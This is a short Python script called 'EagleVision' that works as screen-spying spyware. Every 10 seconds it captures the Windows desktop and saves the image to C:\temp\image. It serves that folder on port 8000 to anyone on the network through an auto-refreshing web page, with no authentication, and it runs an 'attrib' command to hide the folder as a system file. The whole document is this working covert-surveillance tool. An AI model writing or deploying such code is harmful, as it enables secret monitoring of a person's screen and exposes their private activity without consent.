from PIL import ImageGrab
from multiprocessing import Process
import time
import http.server
import socketserver
import os

def httpserver():
    PORT = 8000
    web_dir = os.path.join(os.path.dirname("C:\\temp\\image\\"))
    os.chdir(web_dir)
    Handler = http.server.SimpleHTTPRequestHandler
    httpd = socketserver.TCPServer(("", PORT), Handler)
    print("EagleVision is serving at port", PORT)
    httpd.serve_forever()

def EagleVision():
    while 7==7:
        Vision = ImageGrab.grab()
        Vision.save('C:\\temp\\image\\EagleVision.png')
        time.sleep(10)

if __name__ == '__main__':
    Process(target=httpserver).start()
    Process(target=EagleVision).start()
    if not os.path.exists('C:\\temp\\image\\'):
        os.makedirs('C:\\temp\\image\\')
    f = open('C:\\temp\\image\\index.html','wb')
    f.write("<title>EagleVision</title><img src='EagleVision.png' width='1280' height='720'><meta http-equiv='refresh' content='1.1'>".encode())
    f.close()
    hidden = 'attrib +s +a +h C:\\temp'
    os.system(hidden)